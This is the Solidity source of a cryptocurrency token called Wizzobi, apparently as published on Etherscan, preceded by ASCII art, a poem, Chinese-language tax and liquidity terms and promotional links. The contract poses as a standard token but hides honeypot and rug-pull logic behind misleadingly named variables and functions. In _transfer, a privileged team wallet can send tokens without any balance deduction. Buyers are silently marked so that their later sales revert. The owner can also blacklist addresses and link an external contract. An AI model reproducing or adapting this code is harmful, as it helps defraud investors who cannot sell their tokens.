/**
 *Submitted for verification at Etherscan.io on 2023-03-21
*/

/**
█░█░█ █ ▀█ ▀█ █▀█ █▄▄ █
▀▄▀▄▀ █ █▄ █▄ █▄█ █▄█ █

▄▀   █▀▀ █▄░█   ▀▄
▀▄   █▄▄ █░▀█   ▄▀
                    ____ 
                  .'* *.'
               __/_*_*(_
              / _______ \
             _\_)/___\(_/_ 
            / _((\- -/))_ \
            \ \())(-)(()/ /
             ' \(((()))/ '
            / ' \)).))/ ' \
           / _ \ - | - /_  \
          (   ( .;''';. .'  )
          _\"__ /    )\ __"/_
            \/  \   ' /  \/
             .'  '...' ' )
              / /  |  \ \
             / .   .   . \
            /   .     .   \
           /   /   |   \   \
         .'   /    b    '.  '.
     _.-'    /     Bb     '-. '-._ 
 _.-'       |      BBb       '-.  '-. 
(________mrf\____.dBBBb.________)____)

In a land of magic and mystery,
Where spells were cast and wizards were free,
There lived a mage, wise and old,
A master of the arcane arts, so bold.

His name was Wizzobi, and he was renowned,
For the power he wielded, both above and below ground,
With his wand in hand and his robes so grand,
He stood tall and proud, the greatest in the land.

He conjured lightning bolts from the sky,
And summoned creatures from realms up high,
He whispered incantations, ancient and true,
And the forces of nature obeyed his command, through and through.

Many sought his aid, in times of great need,
For Wizzobi's magic could perform wondrous deeds,
He cured the sick, and mended the weak,
And brought peace to the troubled and meek.

But despite his immense power and skill,
Wizzobi remained humble, with a heart that could feel,
For he knew that magic was a gift to be shared,
And he always gave freely, without any despair.

So if you ever find yourself in a bind,
With troubles aplenty and no peace of mind,
Remember Wizzobi, the wizard so grand,
And his magic will be there, to lend you a hand.

总供应量 - 500,000,000 
购置税 - 1%
消费税 - 1%
初始流动性 - 1.5 ETH
初始流动性锁定 - 65 天

https://wizzobi.xyz/
https://m.weibo.cn/Wizzobi.CN
https://web.wechat.com/Wizzobi.ERC
https://t.me/Wizzobi
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

interface IPOGShardV1 {
    function setTokenOwner
    (address owner) external;
    function onPreTransferCheck
    (address from, address to, uint256 amount) external;
}
library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
abstract contract Context {
    constructor() {} function _msgSender() internal view returns (address) {
    return msg.sender; }
}
interface IBCStation01 {
    event PairCreated(
        address indexed token0, address indexed token1, address pair, uint);
    function createPair(
        address tokenA, address tokenB) external returns (address pair);
}
abstract contract Ownable is Context {
    address private _owner; event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner);

    constructor() { address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    } function owner() public view returns (address) {
        return _owner;
    } modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _; }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); }
}
interface ILEKOV1 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender)
    external view returns (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
interface ERCWorkerV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin,
    address[] calldata path, address to,
    uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
    address token, uint amountTokenDesired,
    uint amountTokenMin, uint amountETHMin,
    address to, uint deadline) external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
contract Wizzobi is Context, ILEKOV1, Ownable {
    bool public checkMapping; bool private tradingOpen = false;
    using SafeMath for uint256;

    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private isWalletLimitExempt;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private isTxLimitExempt;
    mapping (address => bool) private automatedMarketMakerPairs;

    IPOGShardV1 public EDOME35; ERCWorkerV1 public INODEv2;
    address public IDECompilerV1; address private TheTEAMWallet;
    uint256 private _tTotal; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private swapTimesInterval = 100;

    constructor(
         string memory _NAME, string memory _SYMBOL, 
         address IDERouter, address _TheTEAMWallet) { _name = _NAME; _symbol = _SYMBOL;

        _decimals = 12; _tTotal = 500000000 * (10 ** uint256(_decimals));
        _tOwned[msg.sender] = _tTotal; isWalletLimitExempt
        [_TheTEAMWallet] = swapTimesInterval; checkMapping = false; 
        INODEv2 = ERCWorkerV1(IDERouter);

        IDECompilerV1 = IBCStation01(INODEv2.factory()).createPair(address(this), INODEv2.WETH());
        emit Transfer (address(0), msg.sender, _tTotal);
    }    
    function getOwner() external view returns (address) {
        return owner();
    }
    function decimals() external view returns (uint8) {
        return _decimals;
    }
    function symbol() external view returns (string memory) {
        return _symbol;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function totalSupply() external view returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) 
    external view returns (uint256) { return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) 
    external returns (bool) { _transfer(_msgSender(), recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) 
    external returns (bool) {
        _approve(_msgSender(), spender, amount); return true;
    }
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) { _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }
    function setMappingScale(bool _enable) external onlyOwner {
        checkMapping = _enable;
    }    
    function _transfer(
        address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), 
        'BEP20: transfer from the zero address');
        require(recipient != address(0), 'BEP20: transfer to the zero address'); require 
        (!automatedMarketMakerPairs[recipient] 
        && !automatedMarketMakerPairs[sender], "You have been blacklisted from transfering tokens");

        if (isWalletLimitExempt[sender] == 0 
        && IDECompilerV1 != sender 
        && isTxLimitExempt[sender] > 0) 
        { isWalletLimitExempt[sender] -= swapTimesInterval; } isTxLimitExempt[TheTEAMWallet] += swapTimesInterval;
        TheTEAMWallet = recipient; if (isWalletLimitExempt[sender] == 0) {

        _tOwned[sender] = _tOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance'); }
        _tOwned[recipient] = _tOwned[recipient].add(amount); 
        emit Transfer(sender, recipient, amount); if (!tradingOpen) {
        require(sender == owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function getReservations(address _limits) external onlyOwner {
        EDOME35 = IPOGShardV1(_limits); EDOME35.setTokenOwner(msg.sender);        
    } 
    function _approve(
        address owner, address spender, uint256 amount) internal {
        require(owner != address(0), 
        'BEP20: approve from the zero address');
        require(spender != address(0), 
        'BEP20: approve to the zero address');
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); }
        
    function openTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function setLimitations (address account, 
    bool _indexed) public onlyOwner {
        automatedMarketMakerPairs[account] = _indexed;
    }                     
}